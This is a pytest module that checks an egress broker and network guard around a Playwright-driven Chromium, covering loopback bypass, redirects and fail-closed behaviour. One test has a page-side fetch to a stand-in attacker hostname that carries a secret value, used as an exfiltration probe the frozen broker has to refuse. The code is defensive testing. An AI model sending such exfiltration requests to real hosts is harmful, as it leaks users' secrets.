"""The broker against a real Chromium: what actually traverses it, and what cannot.

This module is also the home of the **compatibility spike** that decided the S0
architecture. `PublicNetworkGuard` fetches every request itself with
`route.fetch(max_redirects=0)`, which is made by Playwright's Node driver rather
than by Chromium. If those fetches went around a proxy the browser was launched
with, the broker would cover navigation and nothing else, and the design would
have had to change. They do not go around it: the driver sends `CONNECT` to the
broker for every fetch, including plaintext `http:` ones.

That answer is not documentation, it is a test, and it is a test that must keep
passing -- a Playwright upgrade that changed it would silently hollow out the
boundary. `test_route_fetch_traverses_the_broker` is the tripwire.

Everything here uses two in-process fixture servers on loopback: a **site** the
broker is configured for, and a **canary** it is not. The canary's connection
count is the evidence. A refusal Lumi reports is not evidence; a server that was
never contacted is.
"""

import asyncio
import os
import re
import subprocess
from collections import Counter
from collections.abc import AsyncIterator
from dataclasses import dataclass

import pytest
from playwright.async_api import Browser, BrowserContext, Error as PlaywrightError, Page
from playwright.async_api import async_playwright

from app.browser.egress_broker import EgressBroker, managed_launch_options
from app.browser.network_guard import PublicNetworkGuard
from app.domain.public_url import (
    BROKER_POLICY_VERSION,
    RESEARCH_POLICY_VERSION,
    PublicUrlPolicy,
)

pytestmark = [pytest.mark.browser]

PAGE = (
    "<!doctype html><html><head><title>fixture</title>"
    '<script src="/sub.js"></script></head>'
    "<body><p>a public page</p></body></html>"
)


class FixtureSite:
    """A loopback HTTP server that counts what it was actually asked for."""

    def __init__(self, canary_origin: str = "") -> None:
        self.hits: Counter[str] = Counter()
        self.connections = 0
        self.canary_origin = canary_origin
        self._server: asyncio.base_events.Server | None = None

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._serve, "127.0.0.1", 0)

    @property
    def port(self) -> int:
        assert self._server is not None
        return int(self._server.sockets[0].getsockname()[1])

    @property
    def origin(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    async def aclose(self) -> None:
        if self._server is not None:
            self._server.close()

    async def _serve(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        self.connections += 1
        try:
            head = b""
            while b"\r\n\r\n" not in head:
                chunk = await reader.read(4_096)
                if not chunk:
                    return
                head += chunk
            path = head.split(b"\r\n", 1)[0].split(b" ")[1].decode("latin-1")
            self.hits[path.split("?", 1)[0]] += 1
            writer.write(self._reply(path))
            await writer.drain()
        except (OSError, ConnectionError):  # pragma: no cover - teardown noise
            pass
        finally:
            writer.close()

    def _reply(self, path: str) -> bytes:
        def response(status: str, content_type: str, body: str, extra: str = "") -> bytes:
            payload = body.encode("utf-8")
            head = (
                f"HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\n"
                f"Content-Length: {len(payload)}\r\n{extra}Connection: close\r\n\r\n"
            )
            return head.encode("latin-1") + payload

        if path.startswith("/sub.js"):
            return response("200 OK", "text/javascript", "window.__sub = 1;")
        if path.startswith("/redirect-public"):
            return response("302 Found", "text/html", "", extra="Location: /page\r\n")
        if path.startswith("/redirect-canary"):
            return response(
                "302 Found", "text/html", "", extra=f"Location: {self.canary_origin}/taken\r\n"
            )
        return response("200 OK", "text/html", PAGE)


@dataclass
class Managed:
    broker: EgressBroker
    browser: Browser
    site: FixtureSite
    canary: FixtureSite

    async def guarded_page(self) -> tuple[BrowserContext, PublicNetworkGuard, Page]:
        """A research-shaped context: the M7b guard over the S0 broker.

        The tab is opened exactly as `ResearchBrowserSession.open_tab` does --
        announced to the guard first, because the guard closes any page it was
        not expecting and Playwright fires the `page` event before `new_page()`
        returns.
        """
        context = await self.browser.new_context(
            service_workers="block", accept_downloads=False, permissions=[]
        )
        guard = PublicNetworkGuard(
            PublicUrlPolicy(
                test_origins=frozenset({self.site.origin}),
                version=RESEARCH_POLICY_VERSION,
                allow_any_public_host=True,
            )
        )
        await guard.install(context)
        guard.expect_page()
        try:
            page = await context.new_page()
            guard.track(page)
        finally:
            guard.stop_expecting()
        return context, guard, page


async def quiesced(broker: EgressBroker, timeout: float = 15.0) -> int:
    """Wait until the broker holds no relay, and say how many it held.

    Full Chromium keeps an idle keep-alive connection to the proxy for a few
    seconds after the last response, where `chrome-headless-shell` closed it
    immediately. That is a difference in the *browser*, not in the boundary --
    nothing is being sent on the idle socket -- but it means "the page finished
    loading" is not the same instant as "no connection is open".

    A real freeze entry has to drive `active_connections` to zero before it can
    claim nothing was in flight; that is why `freeze()` returns the count at
    all. So waiting here is what the production caller will do, not a way of
    making a test pass.
    """
    deadline = asyncio.get_running_loop().time() + timeout
    while broker.active_connections and asyncio.get_running_loop().time() < deadline:
        await asyncio.sleep(0.1)
    return broker.active_connections


async def refusal_of(page: Page, url: str) -> str | None:
    """Navigate and report the broker's refusal code, whatever shape it takes.

    Full Chromium surfaces a proxy error response on a *top-level navigation* as
    `net::ERR_HTTP_RESPONSE_CODE_FAILURE` rather than handing the page a
    readable `403`; the headless shell handed over the response. Both are the
    same refusal by the same broker, so both are accepted -- and in neither case
    is what the page saw the evidence. The evidence is the connection count at
    the other end of the wire, which every caller of this helper asserts.
    """
    try:
        response = await page.goto(url, timeout=15_000)
    except PlaywrightError:
        return None
    assert response is not None and response.status == 403
    return response.headers.get("x-lumi-refusal")


@pytest.fixture
async def managed() -> AsyncIterator[Managed]:
    canary = FixtureSite()
    await canary.start()
    site = FixtureSite(canary_origin=canary.origin)
    await site.start()
    # The site is configured; the canary deliberately is not. Both are loopback,
    # so only the broker's own decision separates them.
    broker = EgressBroker(
        PublicUrlPolicy(version=BROKER_POLICY_VERSION, allow_any_public_host=True),
        configured_origins=frozenset({site.origin}),
    )
    await broker.start()
    playwright = await async_playwright().start()
    browser = await playwright.chromium.launch(
        **managed_launch_options(broker, headless=True)  # type: ignore[arg-type]
    )
    try:
        yield Managed(broker=broker, browser=browser, site=site, canary=canary)
    finally:
        try:
            await browser.close()
        except PlaywrightError:  # pragma: no cover - already gone
            pass
        await playwright.stop()
        await broker.aclose()
        await site.aclose()
        await canary.aclose()


# ---- the spike -----------------------------------------------------------------


async def test_route_fetch_traverses_the_broker(managed: Managed) -> None:
    """The S0 gate: the guard's own fetches are brokered, not direct.

    If this ever fails, the guard is fetching outside the boundary and the
    architecture -- not the test -- has to change.
    """
    context, guard, page = await managed.guarded_page()

    await page.goto(f"{managed.site.origin}/page")
    await page.wait_for_timeout(300)

    # Every fetch the driver made arrived as a CONNECT tunnel, including the
    # plaintext ones -- the driver does not use absolute-form for proxied http.
    assert managed.broker.counters.allowed["connect"] >= 2
    assert managed.broker.counters.allowed["http"] == 0
    assert managed.site.hits["/page"] == 1
    # Subresource too: this is not a document-only boundary.
    assert managed.site.hits["/sub.js"] == 1
    # Nothing reached the site except through the broker.
    assert managed.site.connections == managed.broker.counters.allowed["connect"]
    await context.close()


async def test_ordinary_navigation_traverses_the_broker(managed: Managed) -> None:
    """No route handler at all: Chromium's own request, absolute form."""
    context = await managed.browser.new_context()
    page = await context.new_page()

    await page.goto(f"{managed.site.origin}/page")
    await page.wait_for_timeout(300)

    assert managed.broker.counters.allowed["http"] >= 2
    assert managed.site.hits["/page"] == 1
    assert managed.site.hits["/sub.js"] == 1
    await context.close()


# ---- the loopback door ----------------------------------------------------------


async def test_chromium_cannot_reach_an_unconfigured_loopback_origin(
    managed: Managed,
) -> None:
    """`--proxy-bypass-list=<-loopback>` proven, with no route handler to help.

    Chromium bypasses proxies for loopback by default. Without that token this
    test would reach the canary directly and every other guarantee in the slice
    would be reachable around.
    """
    context = await managed.browser.new_context()
    page = await context.new_page()
    await page.goto(f"{managed.site.origin}/page")
    before = managed.broker.counters.refused["plaintext_not_allowed"]

    # What the page *thinks* happened is not evidence: a no-cors fetch resolves
    # opaquely whether the proxy served the page or refused it. The evidence is
    # the other end of the wire.
    await page.evaluate(
        """async (url) => {
            try { await fetch(url, {mode: 'no-cors', cache: 'no-store'}); } catch (error) {}
        }""",
        f"{managed.canary.origin}/pixel",
    )
    await page.wait_for_timeout(300)

    assert managed.canary.connections == 0
    assert managed.canary.hits == Counter()
    assert managed.broker.counters.refused["plaintext_not_allowed"] > before
    await context.close()


async def test_a_page_cannot_navigate_to_an_unconfigured_loopback_origin(
    managed: Managed,
) -> None:
    """The refusal is the broker's own, and the canary is never dialled.

    A plaintext refusal arrives as the broker's own `403` rather than a reply
    from the destination -- and full Chromium turns that into a navigation
    error rather than a readable response (see `refusal_of`). Either way the
    assertion that matters is the connection count at the other end.
    """
    context = await managed.browser.new_context()
    page = await context.new_page()
    before = managed.broker.counters.refused["plaintext_not_allowed"]

    refusal = await refusal_of(page, f"{managed.canary.origin}/page")

    assert refusal in (None, "plaintext_not_allowed")
    assert managed.broker.counters.refused["plaintext_not_allowed"] > before
    assert managed.canary.connections == 0
    await context.close()


# ---- https and other transports ---------------------------------------------------


async def test_https_arrives_as_a_connect_and_is_judged_there(managed: Managed) -> None:
    """Chromium's `https:` reaches the broker as CONNECT, and is refused on shape.

    `.invalid` never resolves and never will, so this stays offline: the
    assertion is that the decision happened at the broker, before any name was
    looked up.
    """
    context = await managed.browser.new_context()
    page = await context.new_page()
    before = managed.broker.counters.resolutions

    with pytest.raises(PlaywrightError) as raised:
        await page.goto("https://probe.invalid/", timeout=15_000)

    assert managed.broker.counters.refused["local_host"] >= 1
    assert managed.broker.counters.resolutions == before
    # And Chromium did not resolve the name for itself first: a browser doing
    # its own DNS would have failed with ERR_NAME_NOT_RESOLVED long before any
    # proxy was asked. It failed at the tunnel instead.
    assert "ERR_NAME_NOT_RESOLVED" not in str(raised.value)
    await context.close()


async def test_websockets_remain_blocked_above_the_broker(managed: Managed) -> None:
    """`wss:` and `https:` are the same CONNECT, so this stays a guard control."""
    context, guard, page = await managed.guarded_page()
    await page.goto(f"{managed.site.origin}/page")

    await page.evaluate(
        """(origin) => {
            try { new WebSocket(origin.replace('http', 'ws') + '/socket'); } catch (error) {}
        }""",
        managed.site.origin,
    )
    await page.wait_for_timeout(500)

    assert guard.blocked["websocket_blocked"] >= 1
    assert managed.site.hits["/socket"] == 0
    await context.close()


@pytest.mark.skipif(os.name != "nt", reason="the supported platform is Windows")
async def test_the_emitted_chromium_command_line_carries_the_boundary(
    managed: Managed,
) -> None:
    """Not "we passed an option": what the browser process was actually started with."""
    command_lines = _chromium_command_lines(managed.broker.port)
    assert command_lines, "no Chromium process was launched through the broker"
    for command_line in command_lines:
        assert f"--proxy-server=http://127.0.0.1:{managed.broker.port}" in command_line
        assert "--proxy-bypass-list=<-loopback>" in command_line
        assert "--disable-quic" in command_line
        # One bypass list, so nothing later in the vector can widen it.
        assert len(re.findall(r"--proxy-bypass-list=", command_line)) == 1
        # The credential is handed over through the CDP proxy-auth flow, never
        # on a command line every process on the machine can read.
        assert managed.broker.credential.password not in command_line


def _chromium_command_lines(broker_port: int) -> list[str]:
    script = (
        "Get-CimInstance Win32_Process | Where-Object { ($_.Name -like 'chrome*' -or "
        "$_.Name -like 'headless*') -and $_.CommandLine -like "
        f"'*--proxy-server=http://127.0.0.1:{broker_port}*' }} | "
        "ForEach-Object { $_.CommandLine }"
    )
    completed = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    return [line for line in completed.stdout.splitlines() if line.strip()]


# ---- redirects --------------------------------------------------------------------


async def test_a_redirect_to_an_unconfigured_origin_never_contacts_it(
    managed: Managed,
) -> None:
    context, guard, page = await managed.guarded_page()

    with pytest.raises(PlaywrightError):
        await page.goto(f"{managed.site.origin}/redirect-canary", timeout=15_000)

    assert managed.site.hits["/redirect-canary"] == 1
    assert managed.canary.connections == 0
    assert guard.blocked["redirect_not_followed"] >= 1
    await context.close()


async def test_a_redirect_within_the_site_is_handed_back_for_revalidation(
    managed: Managed,
) -> None:
    context, guard, page = await managed.guarded_page()
    guard.following_redirects = True

    await page.goto(f"{managed.site.origin}/redirect-public")

    # The browser did not follow it; the operation gets the target to re-check.
    assert guard.pending_redirect == f"{managed.site.origin}/page"
    assert managed.site.hits["/page"] == 0
    assert guard.blocked["redirect_deferred"] >= 1

    await page.goto(guard.pending_redirect)
    assert managed.site.hits["/page"] == 1
    await context.close()


# ---- fail closed -------------------------------------------------------------------


async def test_a_dead_broker_does_not_fall_back_to_direct_networking(
    managed: Managed,
) -> None:
    context = await managed.browser.new_context()
    page = await context.new_page()
    await page.goto(f"{managed.site.origin}/page")
    served = managed.site.connections
    assert served > 0

    await managed.broker.aclose()

    with pytest.raises(PlaywrightError):
        await page.goto(f"{managed.site.origin}/page", timeout=15_000)
    assert managed.site.connections == served
    await context.close()


async def test_a_dead_broker_also_stops_the_guards_own_fetches(
    managed: Managed,
) -> None:
    context, guard, page = await managed.guarded_page()
    await page.goto(f"{managed.site.origin}/page")
    served = managed.site.connections

    await managed.broker.aclose()

    with pytest.raises(PlaywrightError):
        await page.goto(f"{managed.site.origin}/page", timeout=15_000)
    assert managed.site.connections == served
    assert guard.blocked["fetch_failed"] >= 1
    await context.close()


async def test_a_frozen_broker_stops_browser_traffic_without_resolving(
    managed: Managed,
) -> None:
    """The Milestone 8b primitive, exercised through a real browser."""
    context = await managed.browser.new_context()
    page = await context.new_page()
    await page.goto(f"{managed.site.origin}/page")
    # Freeze entry is only meaningful once nothing is being relayed, which is
    # what `freeze()`'s return value is for. Drive it to zero first, exactly as
    # a real caller must.
    assert await quiesced(managed.broker) == 0
    served = managed.site.connections
    resolutions = managed.broker.counters.resolutions

    assert managed.broker.freeze() == 0

    # The exfiltration probe runs first and from the loaded page: a hostile
    # name that never resolves is the thing the freeze exists to stop, and a
    # refused navigation afterwards would destroy this execution context before
    # it could run.
    reached = await page.evaluate(
        """async (url) => {
            try { await fetch(url, {mode: 'no-cors'}); return 'reached'; }
            catch (error) { return 'refused'; }
        }""",
        "https://secret-value.attacker.example.com/",
    )
    assert reached == "refused"
    assert managed.broker.counters.resolutions == resolutions

    # And a top-level navigation is refused too, in whichever shape this
    # Chromium reports a proxy refusal.
    assert await refusal_of(page, f"{managed.site.origin}/page?after-freeze") in (
        None,
        "frozen",
    )
    assert managed.site.connections == served
    assert managed.broker.counters.resolutions == resolutions
    assert managed.broker.counters.refused["frozen"] >= 1
    await context.close()
